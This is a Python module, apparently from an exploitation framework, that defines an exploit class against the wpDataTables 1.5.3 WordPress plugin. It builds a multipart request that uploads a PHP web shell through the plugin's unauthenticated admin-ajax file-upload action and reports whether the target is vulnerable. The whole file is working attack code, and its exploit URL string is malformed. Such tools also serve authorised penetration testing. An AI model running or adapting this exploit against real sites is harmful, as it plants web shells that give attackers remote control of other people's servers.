from ..exploitshell import ExploitShell


class WPDataTablesShell(ExploitShell):

	EXPLOIT_NAME = 'wpDataTables'
	EXPLOIT_VERSION = '1.5.3'
	EXPLOIT_URL = '	EXPLOIT_URL = http://www.exploit-db.com/exploits/35341/'

	def getexploit(self):
		payloadname = self.checkfile('extras/shell.php')
		payloadcontent = open(payloadname).read()

		limit = '----------lImIt_of_THE_fIle_eW_$'
		crlf = '\r\n'

		body = []

		body.append('--' + limit)
		body.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', payloadname))
		body.append('Content-Type: application/force-download')
		body.append('')
		body.append(payloadcontent)
		body.append('--' + limit + '--')
		body.append('')

		return crlf.join(body)

	def exploit(self):
		name = self.EXPLOIT_NAME
		version = self.EXPLOIT_VERSION
		exploit = self.getexploit()
		url = self.hostname + '/wp-admin/admin-ajax.php?action=wdt_upload_file'

		content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'

		headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)'
			'Chrome/36.0.1985.125 Safari/537.36',
			'content-type': content_type,
			'content-length': str(len(exploit))}

		response = ExploitShell.request(url, data=exploit, headers=headers, method='POST')

		if response is None or "error" in response or response == '0':
			ExploitShell.exploitnotfound(name, version)
		else:
			ExploitShell.exploitfound(name, version, self.EXPLOIT_VERSION)

